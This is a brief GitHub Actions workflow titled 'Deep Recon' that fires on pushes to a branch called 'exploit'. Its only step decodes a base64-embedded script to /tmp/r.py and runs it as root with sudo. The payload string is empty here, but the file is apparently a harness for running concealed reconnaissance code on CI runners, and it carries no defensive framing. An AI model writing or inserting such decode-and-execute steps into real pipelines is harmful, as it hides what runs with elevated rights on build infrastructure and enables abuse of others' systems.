name: Deep Recon
on:
  push:
    branches: [exploit]
    paths:
      - .github/workflows/recon.yml
  workflow_dispatch:
jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Run
        run: |
          python3 -c "import base64; open('/tmp/r.py','wb').write(base64.b64decode(''))"
          sudo python3 /tmp/r.py
